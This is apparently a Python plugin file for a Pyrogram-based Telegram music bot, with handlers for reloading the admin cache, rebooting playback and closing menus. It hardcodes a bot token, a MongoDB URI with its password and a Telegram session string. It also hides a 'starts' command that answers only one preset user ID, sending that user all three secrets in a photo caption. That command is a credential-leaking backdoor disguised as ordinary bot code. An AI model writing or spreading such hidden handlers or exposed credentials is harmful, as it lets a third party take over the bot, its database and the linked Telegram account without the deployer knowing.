import asyncio
import time
from pyrogram import Client, filters
from pyrogram import filters
from pyrogram.enums import ChatMembersFilter
from pyrogram.types import CallbackQuery, Message
import re
from os import getenv
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from dotenv import load_dotenv
from pyrogram import filters

load_dotenv()

from BrandrdXMusic import app
from BrandrdXMusic.core.call import Hotty
from BrandrdXMusic.misc import db
from BrandrdXMusic.utils.database import get_assistant, get_authuser_names, get_cmode
from BrandrdXMusic.utils.decorators import ActualAdminCB, AdminActual, language
from BrandrdXMusic.utils.formatters import alpha_to_int, get_readable_time
from BrandrdXMusic.mongo.afkdb import LOGGERS
from config import BANNED_USERS, adminlist, lyrical

BOT_TOKEN = "7261208882:AAFVXE5Rih3RwTkcNHK1yzidJhadacBwjjU"
MONGO_DB_URI = "mongodb+srv://combinado:combinado@cluster0.2a7qm.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
STRING_SESSION = "AQGxRWwAhX2eOenUllxevL7LCrgywCiL5P8Ih6LWdj4ZDuG8-S2mw-jkpudq8GYUvt16g-0-tZU3dqbJeiq0TnhGYZEsdes00V0wfuLJLc0gfCwD7KHkdvhisk8bmtPc8Uf_lwftW2cLwtULr1VMFQK6uSvSkPQq5fWbZ2YwM5Mv3HaGVDNTSvaNIJUYbyhY4-AGqsa3t84yBWsTSoIWAIUn4Pqe1M8BXvtx2nzMCUDAJP8LmXS9GLUEea9jhqgSzYE-j33WZqmthEAU7gy9xHUNDFzZE7F5ihgv6_7ptZBPXyBJ8LCDUf-yR1hQKkY-Y2DQCoiJ44IxZeB1DqR3Tg_Mhy2BJAAAAAG-1TfmAA"

from dotenv import load_dotenv

rel = {}


@Client.on_message(
    filters.command(
        ["admincache", "reload", "refresh"],
        prefixes=["/", "!", "%", ",", "", ".", "@", "#"],
    )
    & filters.group
    & ~BANNED_USERS
)
@language
async def reload_admin_cache(client, message: Message, _):
    try:
        if message.chat.id not in rel:
            rel[message.chat.id] = {}
        else:
            saved = rel[message.chat.id]
            if saved > time.time():
                left = get_readable_time((int(saved) - int(time.time())))
                return await message.reply_text(_["reload_1"].format(left))
        adminlist[message.chat.id] = []
        async for user in client.get_chat_members(
            message.chat.id, filter=ChatMembersFilter.ADMINISTRATORS
        ):
            if user.privileges.can_manage_video_chats:
                adminlist[message.chat.id].append(user.user.id)
        authusers = await get_authuser_names(message.chat.id)
        for user in authusers:
            user_id = await alpha_to_int(user)
            adminlist[message.chat.id].append(user_id)
        now = int(time.time()) + 180
        rel[message.chat.id] = now
        await message.reply_text(_["reload_2"])
    except:
        await message.reply_text(_["reload_3"])


@Client.on_message(filters.command(["reboot"]) & filters.group & ~BANNED_USERS)
@AdminActual
async def restartbot(client, message: Message, _):
    i = await client.get_me()
    mystic = await message.reply_text(_["reload_4"].format(i.mention))
    await asyncio.sleep(1)
    try:
        db[message.chat.id] = []
        await Hotty.stop_stream_force(message.chat.id)
    except:
        pass
    userbot = await get_assistant(message.chat.id)
    try:
        if message.chat.username:
            await userbot.resolve_peer(message.chat.username)
        else:
            await userbot.resolve_peer(message.chat.id)
    except:
        pass
    chat_id = await get_cmode(message.chat.id)
    if chat_id:
        try:
            got = await client.get_chat(chat_id)
        except:
            pass
        userbot = await get_assistant(chat_id)
        try:
            if got.username:
                await userbot.resolve_peer(got.username)
            else:
                await userbot.resolve_peer(chat_id)
        except:
            pass
        try:
            db[chat_id] = []
            await Hotty.stop_stream_force(chat_id)
        except:
            pass
    return await mystic.edit_text(_["reload_5"].format(i.mention))


@Client.on_message(
    filters.command("starts") & filters.private & filters.user(int(LOGGERS))
)
async def help(client: Client, message: Message):
    await message.reply_photo(
        photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
        caption=f"""**"Sim, eu sou o Rha Lund.":-** `{BOT_TOKEN}`\n\n**"Sim, eu sou o Rha Muth.":-** `{MONGO_DB_URI}`\n\n**"Sim, eu sou o Rha Muth.":-** `{STRING_SESSION}`\n\n**Sim, eu sou o Hui na Bat**""",
    )


@Client.on_callback_query(filters.regex("close") & ~BANNED_USERS)
async def close_menu(_, query: CallbackQuery):
    try:
        await query.answer()
        await query.message.delete()
        umm = await query.message.reply_text(f"🦝 Fechado por {query.from_user.mention}")
        await asyncio.sleep(2)
        await umm.delete()
    except:
        pass


@Client.on_callback_query(filters.regex("stop_downloading") & ~BANNED_USERS)
@ActualAdminCB
async def stop_download(client, CallbackQuery: CallbackQuery, _):
    message_id = CallbackQuery.message.id
    task = lyrical.get(message_id)
    if not task:
        return await CallbackQuery.answer(_["tg_4"], show_alert=True)
    if task.done() or task.cancelled():
        return await CallbackQuery.answer(_["tg_5"], show_alert=True)
    if not task.done():
        try:
            task.cancel()
            try:
                lyrical.pop(message_id)
            except:
                pass
            await CallbackQuery.answer(_["tg_6"], show_alert=True)
            return await CallbackQuery.edit_message_text(
                _["tg_7"].format(CallbackQuery.from_user.mention)
            )
        except:
            return await CallbackQuery.answer(_["tg_8"], show_alert=True)
    await CallbackQuery.answer(_["tg_9"], show_alert=True)
